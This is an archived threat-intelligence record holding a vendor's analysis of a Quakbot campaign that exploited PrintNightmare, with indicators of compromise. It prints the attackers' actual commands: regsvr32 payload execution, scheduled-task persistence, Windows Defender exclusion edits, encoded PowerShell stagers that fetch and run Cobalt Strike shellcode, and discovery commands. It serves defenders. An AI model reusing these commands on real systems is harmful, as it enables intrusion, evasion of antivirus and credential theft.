{
    "id": "21b3c98f-f603-4367-98b6-3df887a949ac",
    "created_at": "2023-01-12T14:59:19.974073Z",
    "updated_at": "2025-03-27T02:09:18.320048Z",
    "deleted_at": null,
    "sha1_hash": "a70742872182d4a56673cd4e8f358cb870832367",
    "title": "2021-11-11 - A Duck Nightmare Quakbot Strikes with QuakNightmare Exploitation",
    "authors": "",
    "file_creation_date": "2022-05-28T15:37:05Z",
    "file_modification_date": "2022-05-28T15:37:05Z",
    "file_size": 6361407,
    "plain_text": "# Quakbot Strikes with QuakNightmare Exploitation\n\n**cynet.com/attack-techniques-hands-on/quakbot-strikes-with-quaknightmare-exploitation/**\n\n## A Duck Nightmare\n\n**Quakbot Strikes with QuakNightmare Exploitation**\n\n_By: Max Malyutin – Orion Threat Research Team Leader_\n\n\n-----\n\n## Prologue:\n\nAfter nearly two months of “summer vacation”, Quakbot is back with a new set of skills and tricks. We have handled several incident response\ncases where Quakbot infected organizations through an email as the initial access vector (malicious spam distribution campaigns) to deliver a\nweaponized Microsoft Office Excel document.\n\n[We found that Quakbot threat actors exploited the PrintNightmare vulnerability (CVE-2021-34527 – “Windows Print Spooler Remote Code](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)\nExecution”) in the later stages of the attack to perform privileged file operations and code execution via the Windows Print Spooler service.\nQuakbot also used credential theft functionality to steal Outlook passwords intended for internal spear-phishing, luring users to interact with\nthe malicious emails to infect additional assets.\n\n[The threat actors also deployed Cobalt Strike beacons which allowed them to launch human-operation activities such as lateral movement,](https://attack.mitre.org/software/S0154/)\ndiscovery, privilege-escalation, etc.\n\nThese actions serve two main objectives – exfiltration of sensitive data and setting up the stage for ransomware execution.\n\n## Quakbot Overview:\n\n[Quakbot (also known as Qabot or Qbot) is a modular Banking Trojan, active since the end of 2007. Quakbot originally targeted financial](https://attack.mitre.org/software/S0650/)\nsectors to steal credentials, financial information, and web browser data by using web injection and browser hooking techniques that allowed\nit to “redirect” API calls to intercept financial data.\n\nIn the last two years, Quakbot’s targets expanded beyond the financial sector. We have observed victims from the IT services industry,\ntelecommunications providers, manufacturing facilities and infrastructure companies. Quakbot threat actors upgraded the range of malicious\ncapabilities and functionality to evade detection and spread via different lateral movement techniques.\n\nIn this same period, we also detected Quakbot infections that include ransomware executions. During our threat intelligence activities and\n[incident response cases we observed instances where Quakbot delivered REvil (A.K.A Sodinokibi) and Egregor ransomware.](https://attack.mitre.org/software/S0496/)\n\n## Case Overview:\n\nIn this report, we will go through Quakbot’s execution tactics, techniques, and procedures (TTPs), and present different behaviors, methods,\ntools, and strategies used by threat actors.\n\nDuring the Cynet Orion Research Team’s continuous campaign hunting cycle, we have observed an increase in malicious email campaigns\nusing Quakbot. Additionally, we have responded to incidents where companies asked for Cynet 360 assistance in Quakbot infections.\n\n\n-----\n\ne Qua bot ect o as t o t a e ecut o pat s e ga e t e t e o o g a es\n\n1. Datoploader\n2. Relativeloader\n\nAs with many infections across organizations today, threat actors obtained an initial foothold through malicious email campaigns that lured\nusers to interact with malicious links or attachments.\n\nIn both cases, a malicious link (lead to a ZIP file) or a direct attachment in the malicious email leads to the next step of the infection – a\nweaponized Office document. The weaponized Office document contains macros code (macro 4.0 XLM) that executes when the user clicks\non “Enable Content”.\n\nThe macro execution leads to multi-stage malicious actions that include a command-and-control (C2) connection, download of malicious\npayloads, and execution of commands.\n[Quakbot threat actors use several Defense Evasion (TA0005) techniques, such as process injection, masquerading, Fileless executions, etc.](https://attack.mitre.org/tactics/TA0005/)\nto bypass security solutions such as anti-virus and EDR.\nThe malicious macro code executes the payload by abusing the legitimate Microsoft file Regsvr32.exe. This type of procedure is also known\nas LOLBin (Living Off the Land Binaries), where threat actors abuse legitimate Microsoft files instead of bringing their own malicious files.\nThese LOLBins files could be abused for proxy execution of processes to bypass whitelisting policies, credential dumping, discovery, and\nmore.\n\n## Quakbot Initial Access Execution Flow:\n\n[Initial Access (TA0001)](https://attack.mitre.org/tactics/TA0001/) [Phishing (T1566) – distribution via malicious spam campaigns.](https://attack.mitre.org/techniques/T1566/)\n[Execution (TA0002)](https://attack.mitre.org/tactics/TA0002/) [User Execution (T1204) – the victim interacts with the malicious link or attachment (weaponized Office document).](https://attack.mitre.org/techniques/T1204/)\n\nThe victim interacts with the weaponized Office document and enables the macros.\n[Defense Evasion (TA0005)](https://attack.mitre.org/tactics/TA0005/) [Signed Binary Proxy Execution: Regsvr32 (T1218.010) – DLL payloads downloaded from C2 server and](https://attack.mitre.org/techniques/T1218/010/)\nexecuted via regsvr32.\n\nThe Quakbot payload executes multiple actions including process hollowing injection, Outlook credential theft, Cobalt Strike beacons, and\nFileless persistence via registry.\n\nFor the first time, we have observed PrintNightmare exploitation in Quakbot infections.\n\nYou can find an analysis of PrintNightmare at the end of this report.\n\n## MITRE Attack Tactics and Techniques Coverage:\n\n\n-----\n\n## Technical Analysis: Initial Access and Execution\n\n**Update by** **[Kevin Beaumont – “Something is going on with Qakbot which alters detection/threat landscape in past week.”](https://twitter.com/GossiTheDog)**\n\nIt seems that threat actors abused enterprises and corporations that are using MS Exchange on-prem in order to distribute malicious emails.\nThis led us to suspect that [ProxyLogon and](https://proxylogon.com/) [ProxyShell vulnerabilities are being exploited. These vulnerabilities allow Quakbot threat actors to](https://www.bleepingcomputer.com/news/microsoft/microsoft-exchange-servers-scanned-for-proxyshell-vulnerability-patch-now/)\nbypass email security policies and propagate Quakbot infections.\n\n**ProxyLogon – CVE-2021-26855, CVE-2021-27065**\n**ProxyShell – CVE-2021-34473, CVE-2021-34523, CVE-2021-31207**\n\nQuakbot “TR” infrastructure stands for the distribution actor name that distributes malicious spam campaigns. This name was given by\nresearchers, who also named the actor “ChaserLdr.”\n\n\n-----\n\nMalicious emails are sent as part of phishing campaigns and contain a link to a compromised URL which leads to the ZIP file. The threat\n[actors’ motivation is to lure the victim to interact with the phishing email and download the ZIP file.](https://attack.mitre.org/techniques/T1566)\n\nHere is a URL search on TR campaign URLs that distribute Quakbot ZIP file:\n\n\n-----\n\n[https://urlhaus.abuse.ch/browse/tag/TR/](https://urlhaus.abuse.ch/browse/tag/TR/)\n\nThe ZIP file contains the weaponized Excel document. We have identified several unique patterns of the weaponized Excel document names,\nincluding:\n\nmiss-[0-9]{9}.xls\ntrend-[0-9]{7}.xls\ncharts-[0-9]{10}.xls\nClaim-Copy-[0-9]{10}.xls\nService-Interrupt-[0-9]{10}.xls\n\nThe weaponized Excel document (Datoploader maldoc) contains a fake Microsoft Office template message which lures the user to click on\ntwo messages:\n\n1. Select “Enable Editing” – Protection View message\n2. Select “Enable Content” – Security Warning message\n\n\n-----\n\nThe weaponized Excel document (Relativeloader maldoc) contains a fake DocuSign template message which lures the user to click on two\nmessages:\n\n1. Select “Enable Editing” – Protection View message\n2. Select “Enable Content” – Security Warning message\n\n\n-----\n\nBoth weaponized Excel documents – Datoploader and Relativeloader – contain malicious macro code. Threat actors crafted these\nweaponized Excel documents with several tricks to bypass security detections and security researchers’ complex analyses.\n\n**[Datoploader contains macro version 4.0 XLM. These macros hide in different Sheets and hide the macros in a white font with highly](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-xlm-macro-4.0)**\nobfuscated code. Evasion techniques include:\n\nHiding sheets in the document\nHiding Excel 4.0 macros in different sheets\nAutoOpen function – run a macro when Excel starts\nHiding the macro formula by applying a white font color\nObfuscation and scrambling of the macros in deferent sheets\n\n\n-----\n\n-----\n\n**Relativeloader also contains macro version 4.0 code and a VBA code that protects with a password. Evasion techniques include:**\n\nHiding sheet in the document\nHiding Excel 4.0 macros in sheet\nVBA code protect with password\nAutoOpen function – run a macro when Excel starts\nHiding the macro formula by applying a black font color\nObfuscation and scrambling of the macro\n\n\n-----\n\n-----\n\n-----\n\n**Update (04/11/2021): We observed a new payload name. Threat actors now name the payload:**\n\ngood.good\ngood1.good\ngood2.good\n\nFor the new payload named good.good, here is the macro code with the new format:\n\nRelativeloader and Datoploader highlight keys in the macros code:\n\n**Artifacts** **Description**\n\n\n-----\n\nKernel32 CreateDirectoryA\nUrlmon URLDownloadToFileA\n\nShell32 ShellExecuteA\n\nC:\\Datop\\test.test\nC:\\Datop\\test1.test\n\nC:\\Datop\\test2.test\n\nC:\\Datop\\good.good\n\nC:\\Datop\\good1.good\n\nC:\\Datop\\good2.good\n\nregsvr32 -silent ..\\[RandomFileName].\n\n[RandomFileName]\nregsvr32.exe C:\\Datop\\test.test\n\n\nWinAPI functions use to download file, create a new directory, and execute\nprocess\n\nNew directory where payload drop.\ngood.good is the new version payloads name\n\nRegsvr32 execution command\n\n\nhttp://[IP]/[0-9]{5}.[0-9]{10}.dat C2 sever pattern for Relativeloader maldoc\n\nThreat actors abuse Regsvr32.exe (MITRE T1218.010) to proxy execute the malicious payload dropped by the macro execution.\n\n## Technical Analysis: Persistence and Defense Evasion\n\nRegsvr32.exe is a legitimate Microsoft file responsible for registering DLL files as command components in the registry. This file is also\nclassified as a LOLBin with application whitelisting (AWL) bypass and execute capabilities.\n\nQuakbot execution flow – Relativeloader:\n\nMalicious Excel macro call process creates (=EXEC) action in order to execute regsvr32 command:\n\n\n-----\n\nThe regsvr32 command executes the payload with -silent parameter:\n\nregsvr32 -silent ..\\Lifas.ver\nregsvr32 -silent ..\\Lifas.ver1\n\nregsvr32 -silent ..\\Lifas.ver2\n\nQuakbot execution flow – Datoploader:\n\nMalicious Excel macro calls process create (ShellExecuteA) action in order to execute regsvr32 command:\n\nC:\\Windows\\SysWOW64\\regsvr32.exe C:\\Datop\\test.test\nC:\\Windows\\SysWOW64\\regsvr32.exe C:\\Datop\\test1.test\n\nC:\\Windows\\SysWOW64\\regsvr32.exe C:\\Datop\\test2.test\n\nIn both cases, the Quakbot execution flow executes the regsvr32 process three times in order to load masqueraded DLL payloads (test,\ngood, random).\n\nIn this step, the machine is fully compromised and infected and Quakbot is ready to strike with the next attack techniques. We discovered that\nthe next step is process injection.\n\n\n-----\n\nQuakbot uses CreateProcessW to create a new process. By default, Quakbot creates an Explore.exe process. There are two other process\nwhich could be injected during the infection:\n\nmsra.exe\nOneDriveSetup.exe\n\nThe Regsvr32 (initial Quakbot loader) process opens a handle (0x1fffff == Full control) to the created Explorer process in order to allocate\nmemory for the malicious code.\n\nWriteProcessMemory function – Writes data to an area of memory in a specified process. The first parameter is hProcess (PID of the target\nprocess) and the third parameter is the lpBuffer (the buffer that contains data to be written in the address space of the specified process).\nAfter the WriteProcessMemory WinAPI function, the Quakbot malicious function executes and injects PE code inside the RWX page of the\ntargeted Explorer process.\n\n\n-----\n\n**Note: Explorer process executes most of the time from C:\\windows directory and not from C:\\windows\\Syswow64\\. Additionally, thanks to**\n[SANS DFIR – Find Evil – Know Normal’s poster, we can confirm that the legitimate parent process of Explorer.exe is userinit.exe. In a](https://www.sans.org/posters/hunt-evil/)\nQuakbot infection, the parent process of injected Explorer process is Regsvr32.\n\nAfter examining the injected explorer process, we have found the C2 configuration in clear text format in the memory:\n\n\n-----\n\nWe have spotted that Quakbot C2 servers’ pattern is https//[IP]/t4\n\n[The injected explorer process creates a Scheduled Task (Scheduled Task/Job: Scheduled Task – T1053.005) with a random name to perform](https://attack.mitre.org/techniques/T1053/005/)\nprivilege escalation and persistence on the infected machine.\n\nScheduled Task creation command:\n\nschtasks.exe “/Create /RU “NT AUTHORITY\\SYSTEM” /tn [TaskName] /tr “regsvr32.exe -s \\”C:\\Users\\*\\AppData\\Local\\Temp\\[payload].dll\\””\n/SC ONCE /Z /ST [Time] /ET [Time]\n\nThe malicious Scheduled Task configured to execute whether or not the user is logged on:\n\n\n-----\n\nIn addition, we saw another form of task creation where the malicious task executes a PowerShell command which launches FileLess\nexecution from this registry value:\n\nschtasks.exe /Create /F /TN “{[0-9]]}” /TR “cmd /c start /min \\”\\” powershell.exe -Command\nIEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\\n\n[Random])[Random])))” /SC HOURLY /MO 4\n\nThe Regsvr32 process executed thanks to the malicious Scheduled Task with System User and performed a process injection to Explorer.exe\n(once more). Additionally, the injected explorer process swapped two new processes of reg.exe.\n\nC:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule; responsible for the below execution:\n\nThe first Reg.exe command executed via injected explorer process:\n\nC:\\Windows\\system32\\reg.exe ADD “HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths” /f /t REG_DWORD /v\n“C:\\ProgramData\\Microsoft\\[RandomPath]” /d “0”\n\nThe second Reg.exe command executed via injected explorer process:\n\nC:\\Windows\\system32\\reg.exe ADD “HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths” /f /t REG_DWORD /v\n“C:\\Users\\*\\AppData\\Roaming\\Microsoft\\[RandomPath]” /d “0”\n\n\n-----\n\nFurthermore, concerning persistence, we have observed a run key persistence (Boot or Logon Autostart Execution: Registry Run Keys /\nStartup Folder – T1547.001):\n\n**Registry Key** **Value** **Data**\n\n\nHKEY_CURRENT_USER\\SOFTWARE\\\n\nMicrosoft\\Windows\\CurrentVersion\n\n\\Run\n\n\nRandom name\nFor example: gbqmhjwbdat\n\nNnrolhjksp\n\niwiqxgkbe\n\n\nregsvr32.exe -s “”C:\\Users\\*\\AppData\\Roaming\\\n\nMicrosoft\\[Random]\\[Random].dll””\n\n\nThe excluded paths are the same paths registered in the data of the Run key value, which means that the run key execution avoids the\nWindows Defender detections, Windows Defender does not scan this path and allows the payloads.\n\nThis action allows threat actors to run the dropped Quakbot payloads from the path added to the Defender exclusions path:\n\nC:\\Users\\*\\AppData\\Roaming\\Microsoft\\[RandomPath]\nC:\\ProgramData\\Microsoft\\ [RandomPath]\n\nMoreover, the initial payloads (test.test or good.good) are overwritten in order to corrupt the artifact:\n\n\n-----\n\nThe next stage of the attack is related to Outlook passwords theft. Quakbot performs this action via credential theft functionality. We have\nobserved an attempt to query and enumerate registry keys and values which are related to Outlook passwords (Credentials from Password\nStores – T1555).\n\nProcesses execution flow:\n\n**Grandparent Process:**\n\nc:\\windows\\syswow64\\regsvr32.exe C:\\Datop\\(test.test or good.good)\n\n**Parent Process:**\n\nc:\\windows\\syswow64\\explorer.exe\n\n**Process:**\n\nc:\\windows\\syswow64\\explorer.exe\n\nQuakbot query value key (RegNtPreQueryValueKey) in order to collect data from:\n\n**Registry Keys:** **Registry values**\n\n\n-----\n\nHKCU:\\SOFTWARE\\MICROSOFT\\WINDOWS NT\\CURRENTVERSION\\WINDOWS MESSAGING\nSUBSYSTEM\\PROFILES\\OUTLOOK\\*\n\nHKCU:\\SOFTWARE\\Microsoft\\Office\\*\\Outlook\\Profiles\\ \\OUTLOOK\\*\n\nHKCU:\\WINDOWS NT\\CURRENTVERSION\\WINDOWS MESSAGING SUBSYSTEM\\PROFILES\\*\n\n## Technical Analysis: Discovery\n\n\nIMAP\nPASSWORD\nPOP3\nPASSWORD\n\nSMTP\nPASSWORD\n\n\n[The injected process also performed discovery basics commands. We have observed the following legitimate Microsoft binaries used for the](https://attack.mitre.org/tactics/TA0007/)\ndiscovery execution:\n\nsysteminfo.exe\narp.exe\nnet.exe\nipconfig.exe\nnetstat.exe\nnltest.exe\nschtasks.exe\nqwinsta.exe\nnslookup.exe\nroute.exe\n\nwhoami /all\narp -a\n\nschtasks.exe /Query /V /FO LIST /TN {*}\n\nnltest /domain_trusts /all_trusts\n\nqwinsta\n\nnslookup -querytype=ALL -timeout=10 _ldap._tcp.dc._msdcs.IPER\n\nroute print\n\nnet accounts/domain\n\n\n-----\n\nsyste o, a p, etstat a d pco g co a ds e e used to gat e o at o o t e ected ac e et a d test co a ds e e\nused to collect information on the domain network. This information allows the threat actors to plan the next steps to execute lateral\nmovement and privilege escalation. The main goal at this point is to pivot to the Domain Controller server and access the Domain Admin user.\n\nAdditionally, we have observed a new Discovery execution flow via an encoded PowerShell command:\n\npowershell -nop -exec bypass -EncodedCommand\nJABzAG8AIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARAB\npAHIAZQBjAHQAbwByAHkAUwBlAHIAdgBpAGMAZQBzAC4ARABpAHIAZQBjAHQAbwByA\nHkAUwBlAGEAcgBjAGgAZQByADsAIAAkAHMAbwAuAGYAaQBsAHQAZQByACAAPQAgACIA\nKAAmACgAcwBhAG0AQQBjAGMAbwB1AG4AdABUAHkAcABlAD0AOAAwADUAMwAwADYA\nMwA2ADkAKQApACIAOwAgACQAcwBvAC4ARgBpAG4AZABBAGwAbAAoACkAIAB8ACAAUw\nBlAGwAZQBjAHQAIAAtAFAAcgBvAHAAZQByAHQAeQAgAEAAewBOAD0AJwBOAGEAbQBlA\nCcAOwAgAEUAPQB7ACQAXwAuAHAAcgBvAHAAZQByAHQAaQBlAHMALgBzAGEAbQBhAG\nMAYwBvAHUAbgB0AG4AYQBtAGUAfQB9ACwAQAB7AE4APQAnAE8AUwAnADsAIABFAD0A\newAkAF8ALgBwAHIAbwBwAGUAcgB0AGkAZQBzAC4AbwBwAGUAcgBhAHQAaQBuAGcAcwB\n5AHMAdABlAG0AfQB9ACwAQAB7AE4APQAnAEQAZQBzAGMAcgAnADsAIABFAD0AewAkAF\n8ALgBwAHIAbwBwAGUAcgB0AGkAZQBzAC4AZABlAHMAYwByAGkAcAB0AGkAbwBuAH0Af\nQAsAEAAewBOAD0AJwBMAGEAcwB0AFQAaQBtAGUAJwA7ACAARQA9AHsAOwAgAFsAZAB\nhAHQAZQB0AGkAbQBlAF0AOgA6AEYAcgBvAG0ARgBpAGwAZQBUAGkAbQBlACgAJABfAC4\nAcAByAG8AcABlAHIAdABpAGUAcwAuAGwAYQBzAHQAbABvAGcAbwBuAHQAaQBtAGUAcw\nB0AGEAbQBwACAALQBhAHMAIABbAHMAdAByAGkAbgBnAF0AKQAuAFQAbwBTAHQAcgB\npAG4AZwAoACcAeQB5AHkAeQAtAE0ATQAtAGQAZAAgAEgASAA6AG0AbQAnACkAfQB9ACw\nAQAB7AE4APQAnAEkAUAAnADsAIABFAD0AewAkAF8ALgBwAHIAbwBwAGUAcgB0AGkAZQ\nBzAC4AaQBwAHYANABhAGQAZAByAGUAcwBzAH0AfQAsAEAAewBOAD0AJwBNAGEAbgBh\nAGcAZQBkAEIAeQAnADsAIABFAD0AewAkAF8ALgBwAHIAbwBwAGUAcgB0AGkAZQBzAC4A\nbQBhAG4AYQBnAGUAZABiAHkAfQB9ACwAQAB7AE4APQAnAHAAcgBpAG0AYQByAHkAZw\nByAG8AdQBwACcAOwAgAEUAPQB7ACQAXwAuAHAAcgBvAHAAZQByAHQAaQBlAHMALgB\nwAHIAaQ\n\nThe decoded malicious command:\n\n$so = New-Object System.DirectoryServices.DirectorySearcher;\n$so.filter = “(&(samAccountType=805306369))”;\n\n$so.FindAll() | Select -Property @{N=’Name’;\n\nE={$_.properties.samaccountname}},@{N=’OS’; E={$_.properties.operatingsystem}},@{N=’Descr’; E=\n{$_.properties.description}},@{N=’LastTime’;\n\nE={; [datetime]::FromFileTime($_.properties.lastlogontimestamp -as [string]).ToString(‘yyyy-MM-dd HH:mm’)}},@{N=’IP’;\n\nE={$_.properties.ipv4address}},@{N=’ManagedBy’; E={$_.properties.managedby}},@{N=’primarygroup’;\n\nE={$_.properties.primarygroup}} | Export-csv ccccOUT.csv -encoding utf8\n\nAdfind.exe commands executed as part of the Discovery action:\n\nadfind.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName\nadfind.exe -b dc=*,dc=* -f objectcategory=computer -csv name cn OperatingSystem dNSHostName\n\n## Technical Analysis: Lateral Movement\n\nQuakbot used [lateral movement techniques by abusing services (Remote Services T1021) in order to spread Quakbot DLLs in network](https://attack.mitre.org/tactics/TA0008/)\nshared folders.\n\n**Parent Process:**\n\nc:\\windows\\system32\\services.exe\n\n**Process:**\n\nregsvr32.exe -s \\\\[IP]\\C$\\[RandomName].dll\n\nregsvr32.exe -s \\\\[IP]\\ADMIN$\\[RandomName].dll\n\nregsvr32.exe -s \\\\[IP]\\\\print$\\[RandomName].dll\n\n## Technical Analysis: Cobalt Strike Activity\n\n\n-----\n\ne a e obse ed Coba t St e e ecut o e o s a o e S e e ess sc pt, p ocess ject o, a d beaco s Coba t St e\nprocess injection, the injected explorer (by Quakbot) is pivoting to another process to inject the Cobalt Strike shell code to a new process, for\nexample, we have detected an injection to dllhost.exe by creating a remote thread on the new injected process.\n\nc:\\windows\\syswow64\\explorer.exe > c:\\windows\\syswow64\\dllhost.exe\n\n**Injected dllhost Page Metadata:**\n\nState=4096 (MEM_COMMIT 0x00001000), Type=131072(MEM_RESERVE 0x00002000),\n\nAllocationProtect=4 (PAGE_EXECUTE_READWRITE 0x40)\n\nAnother Cobalt Strike injected known processes which we have observed during incident response cases:\n\n\\sysnative\\werfault.exe\n\\sysnative\\regsvr32.exe\n\n\\sysnative\\userinit.exe\n\n\\ sysnative\\mstsc.exe\n\n\\sysnative\\net.exe\n\n\\sysnative\\svchost.exe\n\n\\sysnative\\gpupdate.exe\n\n\\sysnative\\lsass.exe\n\n\\sysnative\\searchindexer.exe\n\nCobalt Strike beacons – As we mentioned, the threat actors excluded two paths. One of these paths is C:\\programdata\\Microsoft\\:\n\nC:\\Windows\\system32\\reg.exe ADD “HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths” /f /t REG_DWORD /v\n“C:\\ProgramData\\Microsoft\\[RandomPath]” /d “0”\n\nWe observed that the Cobalt Strike beacons dropped to this directory:\n\n**CS beacon location:**\n\nc:\\programdata\\microsoft\\[Random]\\[Random].dllExecution command-line:\nregsvr32.exe -s ” c:\\programdata\\microsoft\\[Random]\\[Random].dll”\n\nIn addition, we detected an attempt to launch Cobalt Strike Fileless execution via a malicious PowerShell command.\n\n**Parent Process:**\n\nc:\\windows\\system32\\services.exeProcess:\nC:\\windows\\system32\\cmd.exe /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzAD0ATgBlA…=\n\nDecoded base64 command:\n\n$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(“H4sIAAAAAAAAAK1WbXPaOBD… “));IEX (New-Object\nIO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();\n\nGzipStream decompress and FromBase64String, next stage decode command:\n\n\n-----\n\nIn order to decode the Cobalt Strike shellcode, we have used this section:\n\n[Byte[]]$var_code =\n\n[System.Convert]::FromBase64String(’38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um\nfor ($x = 0; $x -lt $var_code.Count; $x++) {\n\n$var_code[$x] = $var_code[$x] -bxor 35\n\n}\n\nVia CyberChef “bake” we get the clear text shellcode, From Base64 ($var_code) and XOR key (bxor 35 hex):\n\nThe shellcode contains “\\\\.\\pipe\\mojo.5688.805…” string that represents the Cobalt Strike beacon pipe inter-process (IPC) mechanism for\ncommunication by using CreateNamePipe and ConnectNamePipe.\n\nCobalt Strike beacon common pipe pattern\n\n\\\\.\\pipe\\mojo.5688.805\n\n\n-----\n\ne se jected o e S e p ocess used a s ec Coba t St e odu e o de to d op add t o a Coba t St e beaco s o ot e\nmachines in the domain through share folders.\n\n\\\\[Host.Doamin]\\admin$\\[0-9]{7}.exe == C:\\Windows\\[0-9]{7}.exe\n\n## Technical Analysis: PrintNightmare\n\nPrintNightmare is a Windows Print Spooler Remote Code Execution (RCE) Vulnerability (CVE 2021 34527) that allows performing privileged\nfile operations via Windows Print Spooler service. Quakbot threat actors successfully exploited this vulnerability and got SYSTEM privileges\nexecution to execute malicious code. Threat actors exploited the PrintNightmare, Print Spooler service (spoolsv.exe), created a DLL payload\nin the C:\\Windows\\System32\\spool\\drivers\\x64\\3\\ path, the payload name spider.dll.\n\nSpoolsv.exe process configured the DLL payload by abusing the Printer registry key and created a new key named “123456”.\n\n**Registry key:**\n\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Drivers\\Version-3\\123456\n\n**DLLs payload path:**\n\nC:\\Windows\\System32\\spool\\drivers\\x64\\3\\spider.dll\n\nThe Print driver key contains values “Configuration File” and “Data File” with the payload DLL name (spider.dll).\n\n\n-----\n\nAfter the exploitation the QuakNightmare process (spoolsv.exe) executed CMD command:\n\nC:\\WINDOWS\\system32\\cmd.exe /c cmd.exe /c C:\\Users\\Public\\25443.exe\n\n## Final Thoughts\n\nOur investigation is still active as we have collected more information and logs from several IR cases of Quakbot infections. We believe that\nthe main goals of the threat actors are to exfiltrate sensitive data and information, and to execute a ransomware attack as we have seen in\nthe past. In addition, we have discovered that Quakbot threat actors abused organizational stolen email credentials to spread new Quakbot\ncampaigns upon additional victims. We will provide updates on any new discoveries from our ongoing Quakbot investigation.\n\n## INDICATORS OF COMPROMISE\n\n**Type** **Indicator of Compromise**\n\n\n-----\n\nWeaponized Office Documents a45df331c681b7e73faf94527cd19a9de28e7f0aa10556a18cb48f7db685ce87\naff999aa8b0cb088f858429aeb0f18dd81337981f807c7aa98d95d9ddae34050\n\nc0168eaf2e409a8d1a968e388d665b213b1f7ae232c24df90ab8731b5fd1cbbd\n\n73249da46ad32f57b75746421ca8d96bc62ce7670a7738bfede3d086826e8a87\n\nef0156fd34e136841f28df011c2ecddf58ee4dcf839d25692b52e086beb98d38\n\n511650dfa48dbea1062ba58fc65b52caacbd4b6a752e40f2c3f8c16f1273c68b\n\n40b203a7b40ba1188d0a56a486eac6d4c289ee6ef3a32ec07c245ef44f325a95\n\n4d1a2e62c2f1d7d9d7ef0b81152bfcc85d68bac0c7ab13b8ed6d03ae27f3dda0\n\n6ca376cd53db43cc7781db3e03782ab28213ed722a52e0d38927d3aba516d9b6\n\nZIP Files c1262d13d3809b9d44a6829357c305308567ae8aeca873cc33307e1eda3a9615\n78bccdfce650d1b0c3023ed1cf7174625e88af831865a926c927a320c1177e10\n\n086e81e972597d576da5e7f43f12d5814c78acc5881e6bdc58e5659ee42c264f\n\nDLL payloads 9e63072408a8d0e91a260ae861efb4f64b5585d61a31eeb35c7a2fb595198d2c\n9a8dabf648db1df5bfd90f49233fe2d15a4af71792cc337abe1e60289ede7dc1\n\n236f9f37dc2604ed8d3faee0b07fc6bb8f4dde68ed89a137023f641ad6076ca4\n\n57f5a2a3e5f5fd1fcd95aa1896e6a104973cc90a3a6a25393b9b1da053f93092\n\n5896105dd86060733851505905f1e29e0e7dd9ade5b310a0298414d441a7da70\n\naff67b2d5bd2634a6d1800e9c2b2232ad6d09b59e1971afb6b04ea3be477d8cd\n\nd59ea14883b19cd3a51c3742d5e86e474266b9fec821b0b5fbd6ec7b55eb58bc\n\n00eeb0fa83ffd92aaee10d2cf851597f429062ea044863e425be8801a41ef379\n\n7af572d912a2bff85817165acc672ef17f1fd776ea03bcb5cbb848604ba46fbf\n\nCommand and Control Server 190[.]73[.]3[.]148\n\n177[.]172[.]5[.]228\n\n181[.]118[.]183[.]27\n\n71[.]13[.]93[.]154\n\n216[.]238[.]71[.]31\n\n216[.]238[.]72[.]121\n\n45[.]9[.]20[.]200\n\n93[.]48[.]80[.]198\n\n86[.]98[.]1[.]197\n\n207[.]246[.]112[.]221\n\n123[.]252[.]190[.]14\n\nPayload Paths C:\\Datop\\test.test\nC:\\Datop\\test1.test\n\nC:\\Datop\\test2.test\n\nC:\\Datop\\good.good\n\nC:\\Datop\\good1.good\n\nC:\\Datop\\good2.good\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-11-11 - A Duck Nightmare Quakbot Strikes with QuakNightmare Exploitation.pdf"
    ],
    "report_names": [
        "2021-11-11 - A Duck Nightmare Quakbot Strikes with QuakNightmare Exploitation.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535559,
    "ts_updated_at": 1743041358,
    "ts_creation_date": 1653752225,
    "ts_modification_date": 1653752225,
    "files": {
        "pdf": "https://archive.orkl.eu/a70742872182d4a56673cd4e8f358cb870832367.pdf",
        "text": "https://archive.orkl.eu/a70742872182d4a56673cd4e8f358cb870832367.txt",
        "img": "https://archive.orkl.eu/a70742872182d4a56673cd4e8f358cb870832367.jpg"
    }
}